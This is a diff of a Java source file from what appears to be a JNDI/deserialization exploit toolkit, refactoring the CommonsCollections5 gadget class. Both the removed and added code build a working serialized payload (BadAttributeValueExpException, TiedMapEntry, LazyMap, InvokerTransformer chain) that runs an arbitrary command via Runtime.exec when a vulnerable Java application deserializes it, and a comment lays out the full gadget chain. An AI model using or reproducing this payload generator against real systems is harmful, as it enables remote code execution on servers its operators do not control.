@@ -1,7 +1,9 @@
 package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
+import com.nu1r.jndi.gadgets.utils.JavaVersion;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -16,37 +18,41 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollections5 {
+/**
+ * 	Gadget chain:
+ *         ObjectInputStream.readObject()
+ *             BadAttributeValueExpException.readObject()
+ *                 TiedMapEntry.toString()
+ *                     LazyMap.get()
+ *                         ChainedTransformer.transform()
+ *                             ConstantTransformer.transform()
+ *                             InvokerTransformer.transform()
+ *                                 Method.invoke()
+ *                                     Class.getMethod()
+ *                             InvokerTransformer.transform()
+ *                                 Method.invoke()
+ *                                     Runtime.getRuntime()
+ *                             InvokerTransformer.transform()
+ *                                 Method.invoke()
+ *                                     Runtime.exec()
+ *
+ * 	Requires:
+ * 		commons-collections
+ */
+public class CommonsCollections5 implements ObjectPayload<BadAttributeValueExpException> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        final String[] execArgs = new String[]{String.valueOf(type)};
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
-        final Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{
-                        String.class, Class[].class}, new Object[]{
-                        "getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke", new Class[]{
-                        Object.class, Object[].class}, new Object[]{
-                        null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class}, execArgs),
-                new ConstantTransformer(1)};
-
-        final Map innerMap = new HashMap();
-
-        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-
-        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
-        Field                         valfield = val.getClass().getDeclaredField("val");
-        Reflections.setAccessible(valfield);
-        valfield.set(val, entry);
-
+        final Transformer[]           transformers = TransformerUtil.makeTransformer(command);
+        final Map                     innerMap     = new HashMap();
+        final Map                     lazyMap      = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry                  entry        = new TiedMapEntry(lazyMap, "su18");
+        BadAttributeValueExpException val          = new BadAttributeValueExpException(null);
+        Reflections.setFieldValue(val, "val", entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
         //序列化
@@ -57,5 +63,14 @@ public class CommonsCollections5 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public BadAttributeValueExpException getObject(String command) throws Exception {
+        return null;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
     }
 }
